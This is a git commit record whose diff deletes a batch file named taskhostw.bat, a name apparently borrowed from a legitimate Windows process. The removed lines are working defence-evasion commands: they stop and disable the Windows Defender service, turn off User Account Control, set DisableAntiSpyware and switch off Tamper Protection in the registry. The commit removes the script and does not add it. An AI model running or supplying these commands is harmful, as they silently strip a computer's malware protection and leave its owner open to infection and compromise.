07cf75d2c0f011f041aa1a5487b43570fdc648dd
adyvot <147879327+adyvot@users.noreply.github.com>
2025-05-15 09:07:40 +0200

    Delete taskhostw.bat

--- taskhostw.bat
+++
@@ -1,8 +0,0 @@
-ÿþ&cls
-ÿþ
-NET stop windefend
-SC config windefend start=disabled
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t "REG_DWORD" /d "0" /f
-sc qc "windefend"
